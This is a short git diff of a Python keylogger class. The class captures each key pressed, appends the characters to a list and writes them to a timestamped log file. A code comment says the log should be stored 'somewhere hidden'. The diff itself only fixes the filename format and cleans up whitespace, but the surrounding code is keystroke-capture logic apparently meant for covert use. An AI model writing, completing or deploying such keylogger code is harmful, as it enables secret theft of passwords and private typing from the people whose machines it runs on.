@@ -5,12 +5,12 @@ from datetime import datetime
 class MyKeyLogger:
     _events = []
     _log_dir = "" # Should make somewhere hidden
-    _log_filename = datetime.strftime(datetime.now(),"%Y%m%d_%H:%M.log")
+    _log_filename = datetime.strftime(datetime.now(),"%Y%m%d_%H%M.log")
     _log_file_fullpath = ""
-    
+
     def __init__(self):
         self._log_file_fullpath = self._log_dir + self._log_filename
-    
+
     def on_press(self, key):
         try:
             self._events.append(str(key.char))
@@ -24,9 +24,9 @@ class MyKeyLogger:
                 pass
             else:
                 print("%s : not logged" % key.name)
-            
+
         self.write_to_file()
-    
+
     def write_to_file(self):
         with open(self._log_file_fullpath, 'a+') as f:
             f.write("".join(self._events))
